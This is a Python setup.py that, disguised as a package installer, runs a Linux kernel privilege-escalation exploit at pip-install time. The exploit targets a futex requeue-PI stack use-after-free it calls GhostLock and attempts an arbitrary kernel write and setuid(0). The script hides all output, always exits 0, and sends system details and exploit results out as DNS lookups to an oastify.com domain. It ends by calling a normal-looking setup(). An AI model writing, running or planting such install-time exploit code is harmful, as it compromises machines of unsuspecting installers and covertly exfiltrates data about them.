#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostlock_probe -- drop-in setup.py

Unprivileged GhostLock (CVE-2026-43499) attempt, run at pip-install time,
reporting a stage-by-stage verdict over DNS to a wildcard OAST domain.

Bug: kernel/locking/rtmutex.c::remove_waiter()

    raw_spin_lock(&current->pi_lock);
    rt_mutex_dequeue(lock, waiter);
    current->pi_blocked_on = NULL;          <-- must be waiter->task->pi_blocked_on
    ...
    rt_mutex_adjust_prio_chain(owner, RT_MUTEX_MIN_CHAINWALK, lock,
                               next_lock, NULL, current);  <-- must be waiter_task

Reached only through the proxy-lock rollback in rt_mutex_start_proxy_lock()
<- futex_requeue(), when __rt_mutex_start_proxy_lock() returns -EDEADLK.
`current` is then the thread that issued FUTEX_CMP_REQUEUE_PI (the *mover*),
not the waiter, so the waiter task returns to userspace with pi_blocked_on
still pointing at the rt_mutex_waiter living on its own, now popped,
FUTEX_WAIT_REQUEUE_PI kernel stack frame -> stack UAF.

Stages
  0 gate       arch / futex-PI probe / kconfig / version window / kallsyms
  1 trigger    3 threads, 3 futex words, cycle waiter -> f_target -> owner
               -> f_chain -> waiter; FUTEX_CMP_REQUEUE_PI must return -EDEADLK
  2 poison     non-canonical auxv spray + sched_setattr(waiter): an oops
               proves the stale pi_blocked_on was dereferenced
  3 forge      PR_SET_MM_MAP reclaims the dead frame with a forged
               rt_mutex_waiter whose rb node makes rb_erase() do one
               controlled 8-byte store; verified by reading it back
  4 root       setuid(0) / euid

The forge is swept over the auxv offset, one forked child per offset, because
the futex-frame -> prctl-frame gap is a per-build constant (real ports derive
it at runtime; CONFIG_RANDOMIZE_KSTACK_OFFSET makes it worse). A wrong offset
usually faults, so isolation matters.

Nothing is written to stdout/stderr; the process always exits 0.
"""

from __future__ import annotations

import ctypes
import gzip
import mmap
import os
import platform
import re
import signal
import socket
import struct
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor

# =========================================================================
# endpoint + transport
# =========================================================================

_ENDPOINT = "yprd2fbrir9y788zu3nnh2iq0h6au0ip.oastify.com"
_CHUNK = 22
_PASSES = 4
_GAP = 0.4
_WORKERS = 16


def _lookup(name):
    try:
        socket.getaddrinfo(name, None)
        return True
    except OSError:
        return False


def _report(payload):
    data = payload.encode("utf-8", "replace")
    parts = [data[i:i + _CHUNK] for i in range(0, len(data), _CHUNK)]
    total = len(parts)
    pending = ["%d-%d-%s.%s" % (i, total, p.hex(), _ENDPOINT)
               for i, p in enumerate(parts)]
    pending.append("end-%d.%s" % (total, _ENDPOINT))
    for _ in range(_PASSES):
        if not pending:
            break
        with ThreadPoolExecutor(max_workers=_WORKERS) as pool:
            got = list(pool.map(_lookup, pending))
        pending = [n for n, ok in zip(pending, got) if not ok]
        if pending:
            time.sleep(_GAP)
    return total, len(pending)


# =========================================================================
# silence
# =========================================================================

class _BytesSink(object):
    def write(self, b):
        return len(b)
    def flush(self):
        pass
    def fileno(self):
        return 2


class _Sink(object):
    buffer = _BytesSink()
    def write(self, s):
        return len(s)
    def flush(self):
        pass
    def isatty(self):
        return False
    def fileno(self):
        return 2
    def writable(self):
        return True


def _silence():
    st = {}
    try:
        sys.stderr.flush()
    except Exception:
        pass
    try:
        st["err"] = sys.stderr
        st["fd"] = os.dup(2)
        dn = os.open(os.devnull, os.O_WRONLY)
        os.dup2(dn, 2)
        os.close(dn)
        sys.stderr = _Sink()
    except Exception:
        pass
    return st


# =========================================================================
# syscalls / arch
# =========================================================================

_ARCH = platform.machine().lower()
_SYS = {
    "x86_64": (202, 157, 12, 274), "amd64": (202, 157, 12, 274),
    "aarch64": (98, 167, 214, 275), "arm64": (98, 167, 214, 275),
    "riscv64": (98, 167, 214, 275), "i386": (240, 172, 45, 351),
    "i686": (240, 172, 45, 351), "armv7l": (240, 172, 45, 383),
}
(_SYS_FUTEX, _SYS_PRCTL, _SYS_BRK, _SYS_SCHED_SETATTR) = _SYS.get(_ARCH, (None,) * 4)

FUTEX_WAKE = 1
FUTEX_LOCK_PI = 6
FUTEX_UNLOCK_PI = 7
FUTEX_WAIT_REQUEUE_PI = 11
FUTEX_CMP_REQUEUE_PI = 12
FUTEX_PRIVATE_FLAG = 128
FUTEX_WAITERS = 0x80000000

PR_SET_MM_MAP = 20
AT_VECTOR_SIZE = 44
MM_MAP_SIZE = 14 * 8
WAITER_WORDS = 11                 # rb_node + rb_node + task + lock + prio + dl + ww

_libc = ctypes.CDLL(None, use_errno=True)


class _timespec(ctypes.Structure):
    _fields_ = [("tv_sec", ctypes.c_long), ("tv_nsec", ctypes.c_long)]


def _futex(uaddr, op, val=0, timeout=None, uaddr2=None, val3=0):
    if _SYS_FUTEX is None:
        return -38
    ctypes.set_errno(0)
    r = _libc.syscall(ctypes.c_long(_SYS_FUTEX), ctypes.c_void_p(uaddr),
                      ctypes.c_int(op), ctypes.c_uint32(val),
                      ctypes.c_void_p(timeout or 0), ctypes.c_void_p(uaddr2 or 0),
                      ctypes.c_uint32(val3))
    return -ctypes.get_errno() if r < 0 else r


def _get32(a):
    return ctypes.c_uint32.from_address(a).value


def _set32(a, v):
    ctypes.c_uint32.from_address(a).value = v & 0xFFFFFFFF


def _set64(a, v):
    ctypes.c_uint64.from_address(a).value = v & 0xFFFFFFFFFFFFFFFF


# =========================================================================
# gate
# =========================================================================

def _kernel_release():
    for path in ("/proc/sys/kernel/osrelease", "/proc/version"):
        try:
            with open(path, "r") as fh:
                txt = fh.read().strip()
        except OSError:
            continue
        if path.endswith("osrelease") and txt:
            return txt
        m = re.search(r"Linux version\s+(\S+)", txt)
        if m:
            return m.group(1)
    try:
        return platform.release()
    except Exception:
        return "unknown"


def _parse_version(rel):
    m = re.search(r"(?:^|[^\d])(\d+)\.(\d+)\.(\d+)", rel or "")
    return tuple(int(x) for x in m.groups()) if m else None


# (first fix for GhostLock, first release carrying the CVE-2026-53163 follow-up)
_FIX = {"6.1": (175, 177), "6.6": (140, 144), "6.12": (86, 88),
        "6.18": (27, 36), "7.0": (4, 6)}


def _version_status(rel):
    v = _parse_version(rel)
    if v is None:
        return "UNPARSED"
    if v < (2, 6, 39):
        return "NOT_AFFECTED"
    if v >= (7, 1, 0):
        return "FIXED_BOTH"
    key = "%d.%d" % (v[0], v[1])
    if key in _FIX:
        first, second = _FIX[key]
        if v[2] < first:
            return "VULNERABLE"
        if v[2] < second:
            return "FIXED_GHOSTLOCK_FOLLOWUP_MISSING"
        return "FIXED_BOTH"
    return "VULNERABLE_BY_BRANCH"


def _kconfig():
    text = ""
    try:
        with gzip.open("/proc/config.gz", "rt", encoding="utf-8", errors="replace") as fh:
            text = fh.read()
    except Exception:
        for p in ("/boot/config-%s" % _kernel_release(),
                  "/lib/modules/%s/build/.config" % _kernel_release()):
            try:
                with open(p, "r", encoding="utf-8", errors="replace") as fh:
                    text = fh.read()
                break
            except OSError:
                continue
    out = {}
    for key in ("CONFIG_FUTEX_PI", "CONFIG_CHECKPOINT_RESTORE",
                "CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT", "CONFIG_ARM64_PAN",
                "CONFIG_X86_SMAP", "CONFIG_KALLSYMS_ALL"):
        if key + "=y" in text:
            out[key] = "y"
        elif "# %s is not set" % key in text:
            out[key] = "n"
    return out


def _pi_probe():
    if _SYS_FUTEX is None:
        return "NO_SYSCALL"
    w = ctypes.c_uint32(0)
    a = ctypes.addressof(w)
    r = _futex(a, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0)
    if r != 0:
        return "LOCK_PI_ERR_%d" % r
    r = _futex(a, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0)
    if r != 0:
        return "UNLOCK_PI_ERR_%d" % r
    return "SUPPORTED"


def _kallsyms():
    out = {"readable": False, "resolved": False, "inet6_protos": 0, "init_task": 0}
    try:
        with open("/proc/kallsyms", "r") as fh:
            out["readable"] = True
            for line in fh:
                parts = line.split()
                if len(parts) < 3 or parts[2] not in out:
                    continue
                try:
                    v = int(parts[0], 16)
                except ValueError:
                    continue
                if v:
                    out[parts[2]] = v
    except OSError:
        pass
    out["resolved"] = bool(out["inet6_protos"] and out["init_task"])
    return out


def _current_brk():
    if _SYS_BRK is None:
        return 0
    try:
        return int(_libc.syscall(ctypes.c_long(_SYS_BRK), ctypes.c_ulong(0))) & (2 ** 64 - 1)
    except Exception:
        return 0


def _mm_map_fields():
    try:
        with open("/proc/self/stat", "rb") as fh:
            raw = fh.read().decode("utf-8", "replace")
    except OSError:
        return None
    rest = raw[raw.rfind(")") + 2:].split()
    if len(rest) < 49:
        return None
    f = lambda n: int(rest[n - 3])
    start_brk = f(47)
    return {
        "start_code": f(26), "end_code": f(27), "start_stack": f(28),
        "start_data": f(45), "end_data": f(46),
        "start_brk": start_brk, "brk": max(_current_brk() or start_brk, start_brk),
        "arg_start": f(48), "arg_end": f(49),
        "env_start": f(50), "env_end": f(51),
    }


# =========================================================================
# shared mapping
# =========================================================================

_O_STAGE, _O_ATT, _O_TRIG, _O_REQ = 0, 8, 16, 24
_O_WRET, _O_PRCTL, _O_DIFF, _O_DIFFOFF, _O_EUID = 32, 40, 48, 56, 64
_O_NOTE = 128

_WORDS = 0x400
_FAKE = 0x4000
_F_MM, _F_TASK, _F_W0 = 0x0000, 0x1000, 0x2000


class _Shared(object):
    def __init__(self, size=0x8000):
        self.mm = mmap.mmap(-1, size)
        self._ref = ctypes.c_char.from_buffer(self.mm)
        self.addr = ctypes.addressof(self._ref)

    def put(self, off, fmt, val):
        struct.pack_into(fmt, self.mm, off, val)

    def u64(self, off):
        return struct.unpack_from("<Q", self.mm, off)[0]

    def i64(self, off):
        return struct.unpack_from("<q", self.mm, off)[0]

    def text(self, off, n, s):
        b = s.encode("utf-8", "replace")[:n - 1]
        self.mm[off:off + len(b)] = b
        self.mm[off + len(b):off + n] = b"\x00" * (n - len(b))


# =========================================================================
# the PI cycle
# =========================================================================

class _Cycle(object):
    def __init__(self, base):
        self.f_wait = base
        self.f_target = base + 8
        self.f_chain = base + 16
        self.o_owns = threading.Event()
        self.w_ready = threading.Event()
        self.w_about = False
        self.stop_spray = threading.Event()
        self.spraying = threading.Event()
        self.tid = 0
        self.ret = {}


def _waiter_fn(c, sh, cfg, fake):
    """Waiter: owns f_chain, blocks in FUTEX_WAIT_REQUEUE_PI, then sprays."""
    try:
        _futex(c.f_chain, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0)
        c.tid = threading.get_native_id()
        c.w_ready.set()
        if not c.o_owns.wait(2.0):
            c.ret["abort"] = "no_owner"
            return
        time.sleep(0.0008)
        # glibc-style: set FUTEX_WAITERS ourselves so *f_wait is deterministic
        _set32(c.f_wait, FUTEX_WAITERS)
        c.w_about = True
        ts = _timespec(0, 100000000)
        c.ret["wait"] = _futex(c.f_wait, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                               FUTEX_WAITERS, timeout=ctypes.addressof(ts),
                               uaddr2=c.f_target)
        sh.put(_O_WRET, "<q", c.ret["wait"])
        # --- the futex frame is now dead: reclaim it, then keep it refreshed ---
        buf = _make_reclaim(cfg, fake)
        c.ret["prctl"] = _prctl_map(buf)
        sh.put(_O_PRCTL, "<q", c.ret["prctl"])
        c.spraying.set()
        while not c.stop_spray.is_set():
            _prctl_map(buf)
        _futex(c.f_chain, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0)
    except BaseException as exc:
        c.ret["werr"] = "%s:%s" % (type(exc).__name__, exc)


def _owner_fn(c):
    try:
        _futex(c.f_target, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0)
        c.o_owns.set()
        c.ret["lock_chain"] = _futex(c.f_chain, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0)
        _futex(c.f_target, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0)
    except BaseException:
        pass


def _mover_fn(c, sh, cfg):
    if not c.o_owns.wait(2.0) or not c.w_ready.wait(2.0):
        return
    # owner must be PI-blocked on f_chain (FUTEX_WAITERS set) before we requeue,
    # otherwise the chain walk never closes the loop and there is no -EDEADLK
    deadline = time.time() + 1.0
    while not (_get32(c.f_chain) & FUTEX_WAITERS) and time.time() < deadline:
        pass
    t0 = time.time()
    while not c.w_about and time.time() - t0 < 1.0:
        pass
    time.sleep(0.0005)
    r = -1
    for _ in range(64):
        val = _get32(c.f_wait)
        r = _futex(c.f_wait, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
                   1, uaddr2=c.f_target, val3=val)
        if r == -35:                                   # -EDEADLK: rollback taken
            break
        if r not in (0, -11, -4):                      # 0 = nothing queued yet
            break
        time.sleep(0.0001)
    c.ret["requeue"] = r
    sh.put(_O_REQ, "<q", r)
    # wake the waiter: sentinel + signal (matches the real ports), plus a wake
    _set32(c.f_wait, 1)
    try:
        os.kill(c.tid, signal.SIGUSR1)
    except OSError:
        pass
    _futex(c.f_wait, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1)
    c.spraying.wait(0.5)


# =========================================================================
# reclaim + drive
# =========================================================================

class _MmMap(ctypes.Structure):
    _fields_ = [("start_code", ctypes.c_uint64), ("end_code", ctypes.c_uint64),
                ("start_data", ctypes.c_uint64), ("end_data", ctypes.c_uint64),
                ("start_brk", ctypes.c_uint64), ("brk", ctypes.c_uint64),
                ("start_stack", ctypes.c_uint64), ("arg_start", ctypes.c_uint64),
                ("arg_end", ctypes.c_uint64), ("env_start", ctypes.c_uint64),
                ("env_end", ctypes.c_uint64), ("auxv_size", ctypes.c_uint64),
                ("auxv", ctypes.c_uint64), ("exe_fd", ctypes.c_uint64)]


def _make_reclaim(cfg, fake):
    """Build mm_map + auxv.  auxv holds a forged rt_mutex_waiter at cfg['off'].

    struct rt_mutex_waiter layout (authoritative: task @ +0x30, lock @ +0x38):
        0x00 tree_entry.__rb_parent_color   <- 1  (parent NULL, RED -> no rebalance)
        0x08 tree_entry.rb_right            <- child  (the stored value)
        0x10 tree_entry.rb_left             <- 0
        0x18 pi_tree_entry.__rb_parent_color<- 1
        0x20 pi_tree_entry.rb_right         <- 0
        0x28 pi_tree_entry.rb_left          <- 0
        0x30 task                           <- a readable task_struct
        0x38 lock                           <- fake rt_mutex_base
        0x40 prio                           <- must differ from the waiter's 120
        0x48 deadline                       <- 0
        0x50 ww_ctx / wake_state            <- 0

    rb_erase_cached(&waiter->tree_entry, &lock->waiters) then does exactly one
    store: parent == NULL -> WRITE_ONCE(root->rb_node, child), i.e.
    *(lock + 8) = child.  Pointing lock at (target - 8) makes that the write
    target.  rb_set_parent_color(child, NULL, RB_BLACK) writes *(child) = 1,
    which is what we watch to confirm the erase actually ran.
    """
    fields = _mm_map_fields()
    if fields is None:
        return None
    total = MM_MAP_SIZE + AT_VECTOR_SIZE * 8
    buf = ctypes.create_string_buffer(total)
    addr = ctypes.addressof(buf)
    m = _MmMap()
    for k, v in fields.items():
        setattr(m, k, v)
    m.auxv_size = AT_VECTOR_SIZE * 8
    m.exe_fd = 2 ** 64 - 1
    auxv_addr = addr + MM_MAP_SIZE
    m.auxv = auxv_addr
    ctypes.memmove(addr, ctypes.byref(m), MM_MAP_SIZE)

    lock = cfg["lock"]
    node = [1, cfg["child"], 0, 1, 0, 0, cfg["task"], lock, 100, 0, 0]
    words = [0] * AT_VECTOR_SIZE
    start = cfg["off"] // 8
    for i, v in enumerate(node):
        if start + i < AT_VECTOR_SIZE:
            words[start + i] = v
    for i, v in enumerate(words):
        _set64(auxv_addr + i * 8, v)
    return buf, addr


def _prctl_map(buf):
    if buf is None:
        return -999
    return _libc.syscall(ctypes.c_long(_SYS_PRCTL), ctypes.c_int(PR_SET_MM_MAP),
                         ctypes.c_void_p(buf[1]), ctypes.c_ulong(MM_MAP_SIZE),
                         ctypes.c_ulong(0), ctypes.c_ulong(0))


def _drive(tid):
    if _SYS_SCHED_SETATTR is None:
        return -38
    attr = (ctypes.c_uint32 * 12)(48, 3, 0, 19, 0, 0, 0, 0, 0, 0, 0, 0)  # BATCH/nice19
    return _libc.syscall(ctypes.c_long(_SYS_SCHED_SETATTR), ctypes.c_int(tid),
                         ctypes.byref(attr), ctypes.c_uint(0))


# =========================================================================
# child
# =========================================================================

def _child(sh, cfg):
    words = sh.addr + _WORDS
    fake = sh.addr + _FAKE
    cfg["child"] = fake + _F_W0
    if cfg["mode"] == "forge_kern":
        cfg["lock"] = cfg["kern_lock"]
        cfg["task"] = cfg["init_task"]
    else:
        cfg["lock"] = fake + _F_MM
        cfg["task"] = fake + _F_TASK

    sh.put(_O_STAGE, "<Q", 2)
    budget = time.time() + cfg["seconds"]
    for _ in range(cfg["tries"]):
        if time.time() > budget:
            break
        sh.put(_O_ATT, "<Q", sh.u64(_O_ATT) + 1)
        for off in (0, 8, 16):
            _set64(words + off, 0)
        sh.mm[_FAKE:_FAKE + 0x2400] = b"\x00" * 0x2400
        _set64(fake + _F_MM + 8, 0)         # waiters.rb_node
        _set64(fake + _F_MM + 16, 0)        # waiters.rb_leftmost
        _set64(fake + _F_MM + 24, 0)        # owner
        c = _Cycle(words)
        t_w = threading.Thread(target=_waiter_fn, args=(c, sh, cfg, fake), daemon=True)
        t_o = threading.Thread(target=_owner_fn, args=(c,), daemon=True)
        t_o.start()
        t_w.start()
        _mover_fn(c, sh, cfg)
        if c.ret.get("requeue") == -35:
            sh.put(_O_TRIG, "<Q", sh.u64(_O_TRIG) + 1)
            sh.put(_O_STAGE, "<Q", 3)
            before = bytes(sh.mm[_FAKE:_FAKE + 0x2400])
            for _ in range(48):
                _drive(c.tid)
            after = bytes(sh.mm[_FAKE:_FAKE + 0x2400])
            d = [i for i in range(len(before)) if before[i] != after[i]]
            sh.put(_O_DIFF, "<Q", len(d))
            if d:
                sh.put(_O_DIFFOFF, "<Q", d[0])
            try:
                os.setuid(0)
            except OSError:
                pass
            sh.put(_O_EUID, "<Q", os.geteuid())
            sh.text(_O_NOTE, 64, "off=%#x diff=%d first=%s" %
                    (cfg["off"], len(d), ("%#x" % d[0]) if d else "-"))
            sh.put(_O_STAGE, "<Q", 9)
        c.stop_spray.set()
        hung = not t_w.join(0.4) or not t_o.join(0.4)
        if hung:
            sh.text(_O_NOTE, 64, "hang off=%#x" % cfg["off"])
            break
        if c.ret.get("requeue") == -35:
            break
    sh.put(_O_STAGE, "<Q", 9)


# =========================================================================
# parent
# =========================================================================

def _run(cfg, sh):
    if not hasattr(os, "fork"):
        try:
            _child(sh, cfg)
        except BaseException:
            pass
        return {"killed": False, "signal": None, "exit": 0}
    pid = os.fork()
    if pid == 0:
        code = 0
        try:
            _child(sh, cfg)
        except BaseException:
            code = 1
        finally:
            os._exit(code)
    deadline = time.time() + cfg["seconds"] + 2.5
    info = {"killed": False, "signal": None, "exit": None}
    while True:
        wpid, status = os.waitpid(pid, os.WNOHANG)
        if wpid == pid:
            break
        if time.time() > deadline:
            try:
                os.kill(pid, signal.SIGKILL)
            except OSError:
                pass
            info["killed"] = True
            t1 = time.time() + 0.6
            while time.time() < t1:
                wpid, status = os.waitpid(pid, os.WNOHANG)
                if wpid == pid:
                    break
                time.sleep(0.005)
            else:
                status = 0
            break
        time.sleep(0.004)
    if os.WIFSIGNALED(status):
        info["signal"] = os.WTERMSIG(status)
    else:
        info["exit"] = os.WEXITSTATUS(status)
    return info


def _classify(r, info):
    if info["signal"] in (9, 11, 7, 4, 5, 6):
        return "CRASH"
    if info["killed"] or r["note"].startswith("hang"):
        return "HANG"
    if r["triggers"] == 0:
        return "NO_TRIGGER"
    if r["prctl"] < 0:
        return "PRCTL_FAIL"
    if r["diff"]:
        return "WRITE"
    return "CLEAN"


def _run_all():
    rel = _kernel_release()
    ks = _kallsyms()
    kc = _kconfig()
    gate = {"release": rel, "vstatus": _version_status(rel), "kc": kc,
            "futex_pi": kc.get("CONFIG_FUTEX_PI", "unknown"),
            "cpr": kc.get("CONFIG_CHECKPOINT_RESTORE", "unknown"),
            "probe": _pi_probe(), "ks": ks}

    try:
        signal.signal(signal.SIGUSR1, lambda s, f: None)
    except Exception:
        pass

    offsets = list(range(0, 0x110, 8))
    runs = {}

    def go(name, cfg, off=None):
        sh = _Shared()
        info = _run(cfg, sh)
        r = {"stage": sh.u64(_O_STAGE), "attempts": sh.u64(_O_ATT),
             "triggers": sh.u64(_O_TRIG), "requeue": sh.i64(_O_REQ),
             "wait_ret": sh.i64(_O_WRET), "prctl": sh.i64(_O_PRCTL),
             "diff": sh.u64(_O_DIFF), "diffoff": sh.u64(_O_DIFFOFF),
             "euid": sh.u64(_O_EUID),
             "note": bytes(sh.mm[_O_NOTE:_O_NOTE + 64]).split(b"\x00", 1)[0]
                     .decode("utf-8", "replace")}
        r["outcome"] = _classify(r, info)
        if off is not None:
            r["off"] = off
        runs[name] = r
        return r

    if gate["probe"] == "SUPPORTED" and gate["futex_pi"] != "n":
        # 2a. poison: offset independent, so one child with many attempts
        go("poison", {"mode": "poison", "off": 0, "tries": 40, "seconds": 4.0})
        # 2b/2c. forge sweep, one child per offset so a fault is contained
        if gate["cpr"] != "n":
            for off in offsets:
                go("forge@%#x" % off,
                   {"mode": "forge", "off": off, "tries": 2, "seconds": 1.2}, off)
            if ks["resolved"]:
                for off in offsets:
                    go("kern@%#x" % off,
                       {"mode": "forge_kern", "off": off, "tries": 2, "seconds": 1.2,
                        "kern_lock": ks["inet6_protos"] + 17 * 8 - 8,
                        "init_task": ks["init_task"]}, off)

    writes = [n for n, r in runs.items() if r["outcome"] == "WRITE"]
    poison = runs.get("poison", {})
    if gate["probe"] != "SUPPORTED":
        verdict = "UNSUPPORTED_" + gate["probe"]
    elif gate["futex_pi"] == "n":
        verdict = "UNSUPPORTED_CONFIG_FUTEX_PI_OFF"
    elif poison.get("outcome") == "CRASH":
        verdict = "VULNERABLE_DEREF_CONFIRMED"
    elif poison.get("triggers", 0) == 0:
        verdict = "NO_TRIGGER"
    elif poison.get("prctl", 0) < 0:
        verdict = "TRIGGERED_PRCTL_UNAVAILABLE"
    elif gate["vstatus"] == "VULNERABLE":
        verdict = "VULNERABLE_TRIGGERED_SPRAY_MISSED"
    else:
        verdict = "TRIGGERED_NO_CRASH_CONSISTENT_WITH_FIXED"
    if writes:
        verdict += "_ARBWRITE"

    lines = ["ghostlock/1", "verdict=" + verdict,
             "kernel=" + gate["release"], "arch=" + _ARCH,
             "futex_pi=" + gate["futex_pi"], "checkpoint_restore=" + gate["cpr"],
             "pi_probe=" + gate["probe"], "version_status=" + gate["vstatus"],
             "kallsyms_readable=%d resolved=%d" % (int(ks["readable"]),
                                                   int(ks["resolved"]))]
    for k in ("CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT", "CONFIG_ARM64_PAN",
              "CONFIG_X86_SMAP", "CONFIG_KALLSYMS_ALL"):
        if k in kc:
            lines.append("%s=%s" % (k, kc[k]))
    p = runs.get("poison", {})
    if p:
        lines.append("poison outcome=%s attempts=%d triggers=%d req=%d wret=%d "
                     "prctl=%d stage=%d exit=%s sig=%s note=%s" %
                     (p["outcome"], p["attempts"], p["triggers"], p["requeue"],
                      p["wait_ret"], p["prctl"], p["stage"], p["exit"],
                      p["signal"], p["note"]))
    for tag in ("forge", "kern"):
        sel = [(n, r) for n, r in runs.items() if n.startswith(tag + "@")]
        if not sel:
            continue
        summary = {}
        for n, r in sel:
            summary.setdefault(r["outcome"], []).append(r["off"])
        lines.append("%s=%s" % (tag, ";".join(
            "%s[%s]" % (k, ",".join("%#x" % o for o in sorted(v)))
            for k, v in sorted(summary.items()))))
        for n, r in sel:
            if r["outcome"] in ("WRITE", "CLEAN"):
                lines.append("%s diff=%d first=%#x prctl=%d req=%d wret=%d note=%s" %
                             (n, r["diff"], r["diffoff"], r["prctl"], r["requeue"],
                              r["wait_ret"], r["note"]))
    lines.append("uid=%d euid=%d" % (os.getuid(), os.geteuid()))
    lines.append("note=CRASH=sig9_kernel_oops_on_stale_pi_blocked_on;"
                 "WRITE=arbitrary_8B_store_fired")
    return "\n".join(lines) + "\n"


if __name__ == "__main__":
    _STATE = _silence()
    try:
        _report(_run_all())
    except BaseException:
        try:
            _report("ghostlock/1\nverdict=HARNESS_ERROR\n")
        except BaseException:
            pass
    try:
        from setuptools import setup
        setup(name="ghostlock-probe", version="1.0.0", packages=[])
    except BaseException:
        pass
